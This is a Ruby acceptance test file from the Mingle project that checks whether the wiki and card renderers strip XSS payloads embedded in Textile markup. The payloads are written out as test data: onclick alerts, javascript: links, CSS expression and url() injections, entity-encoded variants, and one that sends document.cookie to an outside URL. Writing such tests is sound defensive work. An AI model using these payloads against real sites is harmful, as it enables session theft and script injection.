#  Copyright 2020 ThoughtWorks, Inc.
#  
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU Affero General Public License as
#  published by the Free Software Foundation, either version 3 of the
#  License, or (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU Affero General Public License for more details.
#  
#  You should have received a copy of the GNU Affero General Public License
#  along with this program.  If not, see <https://www.gnu.org/licenses/agpl-3.0.txt>.

require File.expand_path(File.dirname(__FILE__) + '/../../../acceptance/acceptance_test_helper')

# see page: mingle/wiki/RedCloth_Injection_Test
# Tags: scenario, redcloth, xss, wiki, cards
class Scenario169RedclothInjectionTest < ActiveSupport::TestCase
  fixtures :users, :login_access

  def setup
    destroy_all_records(:destroy_users => false, :destroy_projects => true)
    @browser = selenium_session
    @project = create_project(:prefix => 'scenario_169', :users => [users(:project_member)])
  end

  def test_style_markup_injection
    textile = %{
      %{color:red" onclick="javascript:alert('close char style XSS');}style markup%
      %{color:red" onclick="javascript:#{to_ascii("alert('close char style XSS');")}}style markup%
    }
    injection = "javascript:alert('close char style XSS')"

    login_as_project_member
    open_project(@project)
    group_assert do
      create_redcloth_page_with_content("red cloth injection test", textile)
      open_wiki_page(@project, "red cloth injection test")
      assert_not_include injection, get_wiki_content_html

      number = create_redcloth_card_with_content('red cloth injection card', textile)
      open_card(@project, number)
      assert_not_include injection, get_card_content_html
    end
  end

  def test_class_markup_injection
    textile = %{
      p(classname" onclick="window.location='http://www.google.com?cookie='+window.document.cookie). class markup
      p(classname" onclick="#{to_ascii("window.location='http://www.google.com?cookie='+window.document.cookie")}). class markup
    }
    injection = "onclick=\"window.location="

    login_as_project_member

    create_redcloth_page_with_content("red cloth injection test", textile)

    open_wiki_page(@project, "red cloth injection test")
    assert_not_include injection, get_wiki_content_html
  end

  def test_lang_markup_injection
    textile = %{
      h3()>[no" onclick=javascript:alert('close_char_lang_XSS');]{color:red}. lang markup

      h3()>[no" onclick=#{to_ascii("javascript:alert('close_char_lang_XSS');")}]{color:red}. lang markup
    }
    injection = "onclick=\"javascript:alert('close_char_lang_XSS')"

    login_as_project_member
    create_redcloth_page_with_content("red cloth injection test", textile)

    open_wiki_page(@project, "red cloth injection test")
    assert_not_include injection, get_wiki_content_html
  end

  def test_id_markup_injection
    textile = %{
      p(#big-red" onclick=javascript:alert('close char id XSS');). id markup
      p(#big-red" onclick=#{to_ascii "javascript:alert('close char id XSS');"}). id markup
    }
    injection = "alert('close char id XSS')"

    login_as_project_member
    create_redcloth_page_with_content("red cloth injection test", textile)

    open_wiki_page(@project, "red cloth injection test")
    assert_not_include injection, get_wiki_content_html
  end

  def test_image_markup_injection
    textile = %{
      !openwindow1.gif(Bunny." onclick="javascript:alert('close char image XSS');)!
      !openwindow1.gif(Bunny." onclick="#{to_ascii("javascript:alert('close char image XSS');")})!
    }
    injection = "alert('close char image XSS')"

    login_as_project_member
    create_redcloth_page_with_content("red cloth injection test", textile)

    open_wiki_page(@project, "red cloth injection test")
    assert_not_include injection, get_wiki_content_html
  end

  def test_url_injections
    textile = %{
      * %{color:red; background: #FFFFFF url('http://some_xss_attack_website.com')}blabla%
      * %{color:red; background-image: url('http://some_xss_attack_website.com')}blabla%
      * %{color:red; background-image: url(alert('xss from url'))}background image url xss%

      * %{color:red; background: #FFFFFF #{to_ascii("url('http://some_xss_attack_website.com')")}}url injection%
      * %{color:red; background-image: #{to_ascii("url('http://some_xss_attack_website.com')")}}url injection 2%
      * %{color:red; background-image: #{to_ascii("url(alert('xss from url'))")}}background image url xss%
    }
    injection = "alert('close char image XSS')"

    login_as_project_member
    create_redcloth_page_with_content("red cloth injection test", textile)
    open_wiki_page(@project, "red cloth injection test")
    wiki_content_html = get_wiki_content_html
    group_assert do
      assert_not_include "http://some_xss_attack_website.com", wiki_content_html
      assert_not_include "alert('xss from url')", wiki_content_html
    end
  end

  def test_image_src_injections
    textile = %{
      !javascript:alert('image_src_xss');!
      !javascript:#{to_ascii("alert('image_src_xss');")}!
    }
    injection = "src=\"javascript:alert('image_src_xss')"

    login_as_project_member
    create_redcloth_page_with_content("red cloth injection test", textile)

    open_wiki_page(@project, "red cloth injection test")
    assert_not_include injection, get_wiki_content_html
  end

  def test_link_injections
    textile = %{
      * !openwindow1.gif!:javascript:alert('link_image_xss');
      * "Linkname":javascript:alert('link_text_xss');
    }

    login_as_project_member
    create_redcloth_page_with_content("red cloth injection test", textile)

    open_wiki_page(@project, "red cloth injection test")
    wiki_content_html = get_wiki_content_html
    group_assert do
      assert_not_include "alert('link_image_xss')", wiki_content_html
      assert_not_include "alert('link_text_xss')", wiki_content_html
    end
  end

  def test_protocal_injection
    textile = %{
      "Protocol":txm://localhost/, assuming txm is a protocol that will launch a desktop application
    }

    login_as_project_member
    create_redcloth_page_with_content("red cloth injection test", textile)

    open_wiki_page(@project, "red cloth injection test")
    assert_not_include "txm://localhost/", get_wiki_content_html
  end

  def test_expression_injection
    textile = %{
      %{color:red; width: expression(1+1));}blabla%
      %{color:red; width: #{to_ascii("expression(1+1);")}}blabla%
    }

    login_as_project_member
    create_redcloth_page_with_content("red cloth injection test", textile)

    open_wiki_page(@project, "red cloth injection test")
    assert_not_include "expression(1+1)", get_wiki_content_html
  end

  def get_wiki_content_html
    @browser.get_raw_inner_html('page-content')
  end

  def get_card_content_html
    @browser.get_raw_inner_html('card-description')
  end

  def to_ascii(string)
    string.unpack("C*").collect {|b| "&##{b};"}.join
  end

  def create_redcloth_page_with_content(name, content)
    page = @project.pages.create!(:name => name)
    page.content = content
    page.redcloth = true
    page.send(:update_without_callbacks)
  end

  def create_redcloth_card_with_content(name, description)
    card = @project.cards.create!(:name => name, :card_type_name => 'Card')
    card.description = description
    card.redcloth = true
    card.send(:update_without_callbacks)
    card.number
  end


end
